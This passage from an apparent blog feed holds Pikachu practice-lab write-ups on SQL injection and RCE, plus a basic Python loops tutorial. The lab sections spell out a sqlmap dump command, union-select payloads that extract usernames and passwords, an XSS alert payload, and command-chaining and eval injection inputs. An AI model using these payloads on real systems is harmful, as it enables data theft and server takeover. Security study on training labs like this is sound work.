‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png" alt="图片.png"></p><h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre><code class="hljs">$sql="select * from user where password like '%$pwd%' order by password";</code></pre><p>%匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。</p><p>如果用户端输入: <code>and 1=1 and '%'=</code><br>则会变成：</p><pre><code class="hljs">$sql="select * from user where password like '%fendo'and 1=1 and '%'='%' order by password";</code></pre><p>存在sql注入。<br>题</p><p><img src="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png" alt="图片.png"></p><p>输入一个单引号’</p><p><img src="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png" alt="图片.png"></p><p>报错，因为单引号导致语句%’没闭合。</p><p>输入 <code>'and 1=1 and '%'='</code> ,此时语句变为：</p><pre><code class="hljs">'%' and 1=1 and '%'='%' order by password</code></pre><p><img src="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png" alt="图片.png"></p><p>还可以：</p><ul><li>%’ and 1=1‐‐’</li><li>‘ and 1=1#</li><li>%’ and 1=1 and ‘%’=’</li></ul><p>可输入 <code>' and 1=1 order by x# </code>通过order by x 确定字段数，输入<code>' and 1=1 order by 3#</code>返回正常页面</p><p>输入<code>order by 4#</code>返回报错，说明字段数为3.</p><p>输入 <code>%' and 1=2 union select 1,2,3#</code></p><p><img src="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png" alt="图片.png"></p><p>（1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu</p><p>（2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到<br>pikachu数据库下所有表名。</p><p>（3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名</p><p>（4）输入 %’ and 1=2 union select 1,2,username from pikachu.users#</p><p>(顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7)</p><h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>xx型注入是什么鬼，看到提示笑死</p><p><img src="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png" alt="图片.png"></p><p>随便输入字符抓个包，是GET型请求，输入特殊字符<code>'"&lt;&gt;666</code>,回显报错.</p><p>尝试闭合一下：<code> #'&gt; &lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>哎嗨！成功弹出xss，我真是进步了。</p><p>差点忘记这是sql注入了，输入一下万能恒等式：<code> ' and 1=1 '%'='</code></p><p>回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。</p><p><img src="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png" alt="图片.png"></p><p>应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp<br>吧。</p><p>1、传输方式为get，传输参数为<code> name=a&amp;submit=%E6%9F%A5%E8%AF%A</code></p><p>2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+<br>单引号会报错，初步推测使用单引号使其闭合</p><p>3、利用联合查询：<code> a') union select 1,2#</code></p><p>爆出数据库名字：<code> a') union select database(),2 #</code></p><p>爆出<br>users：<code> a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' #</code></p><p>查</p><p>列：<code> a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p><p>查字段：<code> a') union select 1,concat(username,password) from pikachu.users #</code></p><p><img src="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png" alt="图片.png"></p><h1 id="quot-insert-update-quot-注入"><a href="#quot-insert-update-quot-注入" class="headerlink" title="&quot;insert/update&quot;注入"></a><code>"insert/update"</code>注入</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;数据库注入漏洞&lt;/p&gt;
&lt;p&gt;SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到</summary>
      
    
    
    
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="SQL注入" scheme="https://sinky.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python学习2</title>
    <link href="https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/"/>
    <id>https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/</id>
    <published>2022-08-13T14:45:32.587Z</published>
    <updated>2022-08-14T02:53:20.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><p>1、<code>if…else…</code></p><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">money</span>=1000<br><span class="hljs-attribute">s</span>=int(input('请输入取款金额：'))<br><span class="hljs-keyword">if</span> money &gt;=s:<br>    <span class="hljs-attribute">money</span>=money-s<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'取款成功，余额为：'</span>,money)<br></code></pre></td></tr></tbody></table></figure><p>eg: 从键盘输入一个数判断奇偶。</p><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">num</span>=<span class="hljs-built_in">int</span>(input(<span class="hljs-string">"请输入一个数字："</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">num</span>%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">num</span>,<span class="hljs-string">'是偶数'</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">num</span>,<span class="hljs-string">'是奇数'</span>)<br></code></pre></td></tr></tbody></table></figure><p>2、多分支：<code>if…elif…else</code></p><p>eg: 录入成绩：90-100为A,80-89为B,70-79为C,60-69为D,50-59为E,输入小于0或大于100为错误输入。</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">score</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">'请输入你的成绩：'</span>))</span><br><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-number">90</span>&lt;=<span class="hljs-variable">score</span>&lt;=<span class="hljs-number">100</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are A"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">80</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">90</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'you are B'</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">70</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">80</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are C"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">60</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">70</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are D"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">0</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">60</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'you are E'</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'Error!!'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>3、嵌套if</p><p>eg: 购物结算时，会员&gt;=200 打八折，&gt;=100打九折，&lt;100不打折；非会员 &gt;=200 打9.5折，&lt;200 不打折</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">answer=<span class="hljs-built_in">input</span>(<span class="hljs-string">"您是否为会员？y or n： "</span>)<br>money=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">"请输入您的金额："</span>))<br><span class="hljs-keyword">if</span> answer==<span class="hljs-string">'y'</span>:<br>    <span class="hljs-keyword">if</span> money&gt;=<span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打八折，您花费了："</span>,money*<span class="hljs-number">0.8</span>)<br>    <span class="hljs-keyword">elif</span> money&gt;=<span class="hljs-number">100</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打九折，您花费了："</span>,money*<span class="hljs-number">0.9</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"不打折，您花费了："</span>,money)<br><span class="hljs-keyword">elif</span> answer==<span class="hljs-string">'n'</span>:<br>    <span class="hljs-keyword">if</span> money&gt;=<span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打九五折，您花费了："</span>,money*<span class="hljs-number">0.95</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"不打折，您花费了："</span>,money)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"您输入有误！"</span>)<br></code></pre></td></tr></tbody></table></figure><p>条件表达式： x if 判断条件 else y</p><p>eg: 比大小</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">"input a num:"</span>))</span><br><span class="hljs-variable">b</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">'input a num:'</span>))</span><br><span class="hljs-function"><span class="hljs-title">print</span>( <span class="hljs-title">str</span>(<span class="hljs-variable">a</span>)+<span class="hljs-string">'大于等于'</span>+<span class="hljs-title">str</span>(<span class="hljs-variable">b</span>)  <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>&gt;<span class="hljs-variable">b</span> <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-title">str</span>(<span class="hljs-variable">a</span>)+<span class="hljs-string">'小于等于'</span>+<span class="hljs-title">str</span>(<span class="hljs-variable">b</span>))</span><br></code></pre></td></tr></tbody></table></figure><p>pass: 占位符，什么也不做。</p><h1 id="内置函数-range"><a href="#内置函数-range" class="headerlink" title="内置函数 range()"></a>内置函数 range()</h1><ul><li>range(stop) —— 创建（0,stop）之间的整数序列，步长为1</li><li>range(start,stop) —— （start,stop）之间，步长为1</li><li>range(start,stop,step) —— （start,stop）,步长为step</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">r</span>=range(10)<br><span class="hljs-built_in">print</span>(r)<br><span class="hljs-attribute">r</span>=range(1,10)<br><span class="hljs-built_in">print</span>(list(r)) #[1, 2, 3, 4, 5, 6, 7, 8, 9]<br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">in</span> r) # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(9 <span class="hljs-keyword">in</span> r) # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r) #<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(9 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r) #<span class="hljs-literal">False</span><br></code></pre></td></tr></tbody></table></figure><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><p>1、<code>while 条件表达式： 循环体</code></p><p>eg: 计算0到4的累加和</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>&lt;<span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">sum</span>+=<span class="hljs-keyword">a</span><br>    <span class="hljs-keyword">a</span>+=<span class="hljs-number">1</span><br>print(<span class="hljs-string">'和为：'</span>,<span class="hljs-built_in">sum</span>)<br> <span class="hljs-comment"># 10</span><br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span>=<span class="hljs-number">1</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>&lt;<span class="hljs-number">101</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">a</span>%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">sum</span>+=<span class="hljs-keyword">a</span><br>    <span class="hljs-keyword">a</span>+=<span class="hljs-number">1</span><br>print(<span class="hljs-built_in">sum</span>)<br> <span class="hljs-comment">#  2550</span><br></code></pre></td></tr></tbody></table></figure><p>2、<code>for-in循环</code></p><p>依次取值，又称遍历</p><p><code>for 变量 in 可迭代对象：  循环体</code></p><p>在循环体中不需要变量时，可写作‘_’</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-string">'python'</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span><br><span class="hljs-variable">for</span> <span class="hljs-variable">a</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">10</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-variable">a</span>)</span><br><span class="hljs-variable">for</span> <span class="hljs-variable">_</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">5</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-string">'人生苦短，我用python'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">sum</span>=0<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,101):<br>    <span class="hljs-keyword">if</span> i%<span class="hljs-attribute">2</span>==0:<br>        sum+=i<br><span class="hljs-built_in">print</span>(sum)<br></code></pre></td></tr></tbody></table></figure><p>eg: 计算千以内的水仙花数</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(100,1000):<br>    <span class="hljs-attribute">c</span>=n%10<br>    <span class="hljs-attribute">b</span>=n//10%10<br>    <span class="hljs-attribute">a</span>=n//100<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">n</span>==a**3+b**3+c**3:<br>        <span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></tbody></table></figure><p>3、流程控制语句break</p><p>用于结束循环结构</p><p>eg:录入密码，最多输入三次，正确则结束退出。</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-function">    <span class="hljs-variable">pwd</span>=<span class="hljs-title">input</span>(<span class="hljs-string">'请输入密码：'</span>)</span><br>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">pwd</span>==<span class="hljs-string">'8'</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'正确'</span>)</span><br>        <span class="hljs-variable">break</span><br>    <span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'错误'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>4、continue 结束当前循环，进入下一循环。</p><p>eg: 1-50之间5的倍数：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">51</span>):<br>    <span class="hljs-attribute">if</span> i%<span class="hljs-number">5</span>!=<span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">continue</span><br>    <span class="hljs-attribute">print</span>(i)<br></code></pre></td></tr></tbody></table></figure><p>5、else 语句</p><p>eg:</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-function">    <span class="hljs-variable">pwd</span>=<span class="hljs-title">input</span>(<span class="hljs-string">"请输入密码："</span>)</span><br>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">pwd</span>==<span class="hljs-string">'8'</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'True'</span>)</span><br>        <span class="hljs-variable">break</span><br>    <span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'False'</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'Sorry,the three times all False'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>6、嵌套循环</p><p>eg: 三行四列的矩形</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(3):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,5):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'*'</span>,<span class="hljs-attribute">end</span>=<span class="hljs-string">'\t'</span>)<br>    <span class="hljs-built_in">print</span>()   <br></code></pre></td></tr></tbody></table></figure><p>eg: 左侧三角型</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'*'</span>,<span class="hljs-attribute">end</span>=<span class="hljs-string">''</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>eg: 打印乘法表</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(i,<span class="hljs-string">'*'</span>,j,<span class="hljs-string">'='</span>,i*j,<span class="hljs-attribute">end</span>=<span class="hljs-string">'    '</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>7、二重循环中break和continue</p><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>        <span class="hljs-attribute">if</span> j%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">break</span><br>        <span class="hljs-attribute">print</span>(j)<br></code></pre></td></tr></tbody></table></figure><p>j=1时，break退回外层循环，此后只执行外层循环；改成continue后，内循环将跳回 <code>for j in range(1,11)</code> 上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分支结构&quot;&gt;&lt;a href=&quot;#分支结构&quot; class=&quot;headerlink&quot; title=&quot;分支结构&quot;&gt;&lt;/a&gt;分支结构&lt;/h1&gt;&lt;p&gt;1、&lt;code&gt;if…else…&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;eg:&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-RCE</title>
    <link href="https://sinky.top/2022/08/11/pikachu-RCE/"/>
    <id>https://sinky.top/2022/08/11/pikachu-RCE/</id>
    <published>2022-08-11T14:17:28.967Z</published>
    <updated>2022-08-11T14:33:04.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p><h2 id="远程系统命令执行"><a href="#远程系统命令执行" class="headerlink" title="远程系统命令执行"></a>远程系统命令执行</h2><p>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通过该接口提交恶意命令，后台执行会控制整个后台服务器。</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</p><pre><code class="hljs">exec "ping"</code></pre><p><img src="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png" alt="图片.png"></p><p>ping一下本地返回正常。</p><p>输入命令： <code>www.baidu.com &amp; ipconfig</code> 发现可以获取到用户的ip地址。</p><p>“&amp;”的作用是先执行 <code>www.baidu.com</code></p><p>或者： &amp;、&amp;&amp;、|、||、； 等拼接执行命令。</p><pre><code class="hljs">exec "eval"</code></pre><p><img src="https://s2.loli.net/2022/08/11/3mcQnH1T2xrGCIb.png" alt="图片.png"></p><p>不知道为啥输入什么都报错</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"></p><p>看了一下网页代码，啥也没有，查看了后台源代码：</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/08/11/OKkmEnHDoWRN94B.png" alt="图片.png"></p><p>用户输入值直接被带入到<code>eval()</code>函数中进行执行，没有任何安全处理。</p><p>输入 <code>phpinfo(); </code>返回显示了php系统信息。</p><p>eval函数的作用是将字符串当作php代码执行，它允许执行任意 PHP 代码</p><p>它允许执行任意 PHP 代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统</summary>
      
    
    
    
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="RCE" scheme="https://sinky.top/tags/RCE/"/>
    
  </entry>
  
</feed>
